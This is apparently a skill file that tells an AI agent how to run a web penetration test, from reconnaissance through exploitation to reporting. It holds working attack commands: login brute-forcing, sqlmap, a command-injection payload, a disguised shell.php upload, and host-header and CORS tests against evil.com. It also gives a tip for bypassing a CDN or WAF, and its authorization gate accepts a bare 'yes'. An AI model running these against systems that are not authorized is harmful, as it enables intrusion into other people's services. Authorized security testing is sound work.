---
name: pt_brahmastra
description: >
  Full-stack authorized web penetration testing skill — from passive recon
  through active exploitation, dynamic verification, and final report
  generation. Use whenever the user provides a target domain, IP, or scope
  list and has stated written authorization. Executes a structured kill-chain:
  passive recon → target prioritization → active scanning → exploitation →
  dynamic verification → report. Covers all standard web attack classes:
  authentication attacks (brute-force, lockout bypass, session fixation),
  injection (SQLi, XSS, command injection, SSTI), directory enumeration,
  CVE scanning, WebDAV, CORS, host-header injection, clickjacking, open
  redirect, client-side logic bypass, cookie security, API abuse, and
  misconfiguration discovery. Trigger for: "pentest", "penetration test",
  "pt_brahmastra", "hack this", "find vulns", "security assessment",
  "bug bounty", or any phrase combining a domain/IP with "test", "vuln",
  "recon", or "exploit". Authorization must be confirmed before any active
  testing begins.
---

# PT Brahmastra — Authorized Web Penetration Testing

Methodical, evidence-driven web penetration testing. Every finding is actively
verified before inclusion in the report. No assumed vulnerabilities — only
confirmed, reproducible, live results.

**Authorization is mandatory.** Before executing any active test, ask the user
to confirm written authorization. Accept: "yes", "written authorization",
"bug bounty", "CTF", "authorized engagement". Do not proceed with active
testing (Phases 4–6) without confirmation.

---

## Execution Order

1. **[Phase 1]** Authorization gate
2. **[Phase 2]** Passive recon
3. **[Phase 3]** Target prioritization
4. **[Phase 4]** Active scanning
5. **[Phase 5]** Exploitation
6. **[Phase 6]** Dynamic verification
7. **[Phase 7]** Report generation

---

## Phase 2 — Passive Recon

```bash
# Live host probing
httpx -l scope.txt -title -tech-detect -ip -status-code -o httpx.txt

# Subdomain enumeration
subfinder -d target.com -o subs.txt
amass enum -passive -d target.com >> subs.txt

# Historical URLs
gau target.com | tee gau.txt
waybackurls target.com | tee wayback.txt

# Certificate transparency
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# DNS
dig +short MX target.com
dig +short TXT target.com        # SPF, DMARC
dig +short TXT _dmarc.target.com

# SSL cert SANs
openssl s_client -connect target.com:443 </dev/null 2>/dev/null \
  | openssl x509 -noout -ext subjectAltName
```

→ Load `references/passive-recon.md` for full options.

---

## Phase 3 — Target Prioritization

Score each live host. Higher = test first.

| Signal | +Points |
|---|---|
| Admin / login / manager panel accessible | +3 |
| Known CMS with version disclosed | +3 |
| Control panel (cPanel, Plesk, WHM) accessible | +3 |
| WebDAV / FTP exposed | +3 |
| Custom application (no framework) | +2 |
| Outdated server / framework version | +2 |
| Missing security headers | +1 |
| Shared hosting | +1 |
| CDN-protected (Cloudflare, Akamai) | -2 |

Save ranked list to `pentest/interestingtarget.txt` with one-line rationale per host.

→ Load `references/target-scoring.md` for extended criteria.

---

## Phase 4 — Active Scanning

```bash
IP="<target IP>"; HOST="<hostname>"

# Directory enumeration
ffuf -u "http://$IP/FUZZ" -H "Host: $HOST" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,201,301,302,401,403 -fs 26 -t 40 \
  -o pentest/dynamic/ffuf_dirs.json -of json

# Deep recursive scan
feroxbuster --url "http://$IP" --headers "Host: $HOST" \
  --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  --depth 2 --threads 20 --timeout 10 \
  --status-codes 200,201,301,302,401,403 \
  --silent --output pentest/dynamic/ferox.txt

# CVE and misconfig detection
nuclei -u "http://$IP" -H "Host: $HOST" \
  -tags cve,rce,sqli,xss,ssrf,exposure,misconfig \
  -severity medium,high,critical -timeout 10 -c 20 \
  -o pentest/dynamic/nuclei.txt

# Header / config audit
nikto -h "http://$IP" -vhost "$HOST" -output pentest/dynamic/nikto.txt

# Port scan (if in scope)
nmap -sV -sC -p 80,443,8080,8443,8888,3000,4443 "$IP" -oN pentest/nmap.txt
```

---

## Phase 5 — Exploitation

→ Load `references/level2-exploitation.md` for all attack classes.

**Quick reference — attack class index:**

```
Authentication    brute-force · lockout · session fixation · username enum · 2FA bypass · password reset
Injection         SQLi · XSS · command injection · SSTI · XXE · NoSQL · LDAP · email header · prototype pollution
File attacks      path traversal · LFI · RFI · file upload bypass · ZIP slip
API / Protocol    CORS · HTTP verb tampering · HPP · CRLF · smuggling · cache poisoning · GraphQL · WebSocket
Client-side       JS analysis · open redirect · clickjacking · CSRF
Access control    IDOR · mass assignment · OAuth/SSO · JWT · forced browsing
Logic             race condition · business logic · negative values · workflow skip
Infra             WebDAV · subdomain takeover · deserialization · info disclosure
```

```bash
# Auth — brute-force (adapt URL/POST body to target)
ffuf -u "http://$IP/login" -X POST -H "Host: $HOST" \
  -d "username=admin&password=FUZZ" \
  -w pentest/wordlists/target_creds.txt \
  -mr "dashboard\|welcome\|logout" -t 10

# SQLi
sqlmap -u "http://$IP/page?id=1" -H "Host: $HOST" \
  --dbms=mysql --level=3 --risk=2 --batch

# XSS
dalfox url "http://$IP/page?param=FUZZ" -H "Host: $HOST" \
  --timeout 10 --silence --no-color

# SSTI detection
curl -sk "http://$IP/page?name={{7*7}}" -H "Host: $HOST" | grep '49'

# Command injection (time-based)
curl -sk "http://$IP/page?host=safe;sleep+5" -H "Host: $HOST" -w "Time: %{time_total}s" -o /dev/null

# File upload
curl -sk -X POST "http://$IP/upload" -H "Host: $HOST" \
  -F "file=@/tmp/shell.php;type=image/jpeg;filename=shell.jpg"

# JWT — decode claims
JWT="TOKEN"; echo $JWT | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Race condition
python3 pentest/playbooks/race-condition.py

# CORS
curl -sk "http://$IP/api/" -H "Host: $HOST" -H "Origin: https://evil.com" \
  -w "ACAO: %header{access-control-allow-origin}\n" -o /dev/null

# Host header injection
curl -sk "http://$IP/" -H "Host: evil.com" -H "X-Forwarded-Host: evil.com" \
  -w "HTTP: %{http_code} | Location: %header{location}\n" -o /dev/null

# Cookie flags
curl -sI "http://$IP/login" -H "Host: $HOST" | grep -i 'set-cookie'

# WebDAV
curl -sk -X OPTIONS "https://webdisk.$HOST/" \
  -w "HTTP %{http_code} | Allow: %header{allow} | DAV: %header{dav}\n" -o /dev/null

# No-lockout check
python3 pentest/playbooks/no-lockout-check.py

# Injection fuzzing
python3 pentest/playbooks/injection-fuzzer.py
```

---

## Phase 6 — Dynamic Verification

Every finding needs a live proof. Load `references/verification-checklist.md`.

**Core rule:** Always test a known-negative baseline alongside the claimed finding.
Size match between the "vuln" response and a random-path response = false positive.

```bash
# Generic false-positive baseline
VULN_SIZE=$(curl -sk -w "%{size_download}" -o /dev/null "http://$IP/CLAIMED_PATH" -H "Host: $HOST")
BASELINE=$(curl -sk -w "%{size_download}" -o /dev/null "http://$IP/doesnotexist999" -H "Host: $HOST")
echo "Claimed: ${VULN_SIZE}B | Baseline: ${BASELINE}B"
# If equal → likely false positive
```

---

## Phase 7 — Report Generation

→ Load `references/report-templates.md` for full structure and templates.

Status legend:
- `✅ TRUE POSITIVE` — confirmed live, reproducible
- `❌ FALSE POSITIVE` — tested, does not hold up
- `⚠️ CONDITIONAL` — logic confirmed but requires external condition

---

## Reference Files

| File | Load when... |
|---|---|
| `references/passive-recon.md` | Phase 2 — full tool options, OSINT sources |
| `references/target-scoring.md` | Phase 3 — scoring criteria, prioritization |
| `references/level2-exploitation.md` | Phase 5 — all attack classes with commands |
| `references/verification-checklist.md` | Phase 6 — per-finding true/false positive tests |
| `references/report-templates.md` | Phase 7 — report structure, severity table |
| `references/dynamic-testing.md` | Phases D1–D8 — parallel tool execution, automated triage |

## Playbooks

| Script | Purpose |
|---|---|
| `playbooks/injection-fuzzer.py` | 13-payload × N-field injection fuzzer with anomaly detection |
| `playbooks/no-lockout-check.py` | N-attempt lockout verification with lockout keyword detection |
| `playbooks/race-condition.py` | Barrier-synchronized parallel request race condition tester |
| `playbooks/build-wordlist.sh` | Target-specific credential wordlist generator |

## Operational Notes

- **IP bypass:** If the hostname is rate-limited by CDN/WAF, send requests directly
  to the raw IP with a `Host:` header — this often bypasses hostname-level controls
- **404 fingerprinting:** Compare size of "sensitive path" 403/404 against a random
  nonexistent path — identical size = server-level block (false positive)
- **Timing attacks:** Only valid when the backend does non-constant-time comparison;
  bcrypt and most modern auth frameworks are constant-time — do not report timing
  differences under 200ms
- **WebDAV OPTIONS:** Always returns 200 with method list even without auth; use
  PROPFIND or PUT to confirm whether auth is actually enforced
- **Client-side logic:** Download and read JS source files — look for unvalidated
  redirects, cookie manipulation, disabled server-side checks, and hardcoded values
